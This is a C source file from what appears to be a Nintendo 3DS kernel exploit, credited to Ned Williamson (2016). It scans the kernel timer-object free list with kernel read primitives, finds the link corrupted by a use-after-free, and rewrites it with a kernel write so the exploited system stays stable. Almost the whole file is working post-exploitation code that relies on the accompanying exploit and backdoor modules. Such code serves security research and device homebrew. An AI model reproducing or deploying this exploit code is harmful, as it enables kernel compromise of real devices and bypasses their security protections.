/* cleanup.c Ned Williamson 2016 */

#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include <util.h>
#include "cleanup.h"
#include "backdoor.h"
#include "exploit.h"

extern u32 ktimer_pool_head;
extern u32 ktimer_pool_size;
extern u32 ktimer_base_offset;

/* is this valid across versions? */
#define KTIMER_OBJECT_SIZE 0x3C

/* This should really be IS_VTABLE but different mappings make it hard
 * to generalize this value. The only base pointers in the slab heap
 * are pointers to the vtable, pointers to kernel objects, and NULL,
 * so this overapproximation is worth the precision tradeoff.
 */
#define IS_KERNEL_NON_SLAB_HEAP(addr) (0xFFF00000 <= (u32)(addr) && (u32)(addr) < 0xFFF70000)
#define TOBJ_ADDR_TO_IDX(base, addr) (((u32)(addr) - (u32)(base)) / KTIMER_OBJECT_SIZE)
#define TOBJ_IDX_TO_ADDR(base, idx) ((u32)(base) + KTIMER_OBJECT_SIZE * (u32)(idx))

static bool find_broken_link(void ***parent_ret, void **child_ret) {
  u32 num_timer_objects = ktimer_pool_size / KTIMER_OBJECT_SIZE;
  // carry
  if (ktimer_pool_size % KTIMER_OBJECT_SIZE) {
      num_timer_objects += 1;
  }
  void *ktimer_base = (void *)(0xFFF70000 + ktimer_base_offset);
  void *ktimer_end = (void *)((u32)ktimer_base + ktimer_pool_size);

  void *next_table[num_timer_objects];
  memset(next_table, 0, num_timer_objects * sizeof(void *));
  void *prev_table[num_timer_objects];
  memset(prev_table, 0, num_timer_objects * sizeof(void *));

  /* initialize return values */
  *parent_ret = NULL;
  *child_ret = NULL;

  u32 i = 0;
  /* build hash tables, O(n) */
  for (void *parent = ktimer_base;
       parent < ktimer_end;
       parent += KTIMER_OBJECT_SIZE, i++) {
    void *child = (void *)kreadint(parent);
    if (TOBJ_ADDR_TO_IDX(ktimer_base, parent) != i) {
      printf("[!] Got TOBJ_ADDR_TO_IDX(parent) != i: 0x%lx != 0x%lx\n",
             TOBJ_ADDR_TO_IDX(ktimer_base, parent), i);
      wait_for_user();
    }
    printf("%ld -> 0x%lx (0x%lx)\n", TOBJ_ADDR_TO_IDX(ktimer_base, parent), (u32)child, TOBJ_ADDR_TO_IDX(ktimer_base, child));
    if (IS_KERNEL_NON_SLAB_HEAP(child)) {
      /* for allocated objects, use non-null filler values since
       * our checks just look for null
       */
      next_table[TOBJ_ADDR_TO_IDX(ktimer_base, parent)] = (void *)1;
      /* write to 'parent' of both next and prev, clearing them */
      /* TODO we should probably be checking if 1 was written already */
      prev_table[TOBJ_ADDR_TO_IDX(ktimer_base, parent)] = (void *)1;
    } else if (child == (void *)TIMER2_NEXT_KERNEL) {
      *parent_ret = parent;
      next_table[TOBJ_ADDR_TO_IDX(ktimer_base, parent)] = (void *)1;
    } else {
      /* if freed, add tuples in both directions */
      next_table[TOBJ_ADDR_TO_IDX(ktimer_base, parent)] = child;
      prev_table[TOBJ_ADDR_TO_IDX(ktimer_base, child)] = parent;
    }
  }
  if (i != num_timer_objects) {
    printf("[!] Unexpected number of iterations over timer object list.\n");
    printf("[!] Got %lu, expected %lu.\n", i, num_timer_objects);
    return false;
  }

  /* account for list head. only care about objects themselves, so don't
   * update next_table.
   */
  void *head_parent = ktimer_pool_head;
  void *head_child = (void *)kreadint_real(head_parent);
  if (head_child) {
    prev_table[TOBJ_ADDR_TO_IDX(ktimer_base, head_child)] = head_parent;
  }

  /* abandoned child node is lowest object with next != NULL, prev == NULL */
  /* first null next: need to write correct next here */
  /* only null prev: what to write there */

  /* this could happen but if we really allocated all the timer objects, the
   * exploit probably work work anyways :p gotta reboot!
   */
  if (next_table[num_timer_objects - 1] != NULL) {
    printf("[!] Warning! Bad invariant: last node does not point to NULL\n");
    printf("[!] The exploit cannot cleanup sufficiently.\n");
    printf("[!] Please reboot your 3DS and try again.\n");
    return false;
  }

  for (i = 0; i < num_timer_objects; i++) {
    /* ignore last node for next, as it's always NULL */
    if (prev_table[i] == NULL) {
      if (*child_ret != NULL) {
        printf("[!] Warning: unexpectedly found more than one NULL prev.\n");
      }
      *child_ret = (void *)TOBJ_IDX_TO_ADDR(ktimer_base, i);
      printf("[+] found child: (%p ->) %p\n", prev_table[i], *child_ret);
    }
  }

  if (*parent_ret == NULL) {
    printf("[-] Failed to find parent for broken link search.\n");
    return false;
  }

  if (*child_ret == NULL) {
    printf("[-] Failed to find child for broken link search.\n");
    return false;
  }

  return true;
}

bool cleanup_uaf() {
  /* TODO: this entire function is TOCTTOU of kernel free list state */
  /* at this point the kernel timer free list contains a userspace item.
   * we need to fix that.
   */

  void **parent = NULL;
  void *child = NULL;

  if (!find_broken_link(&parent, &child)) {
    printf("[-] Failed to find broken link in linked list.\n");
    return false;
  }

  printf("Got broken link: %p -> %p\n", parent, child);

  kwriteint_real((u32 *)parent, (u32)child);
  return true;
}
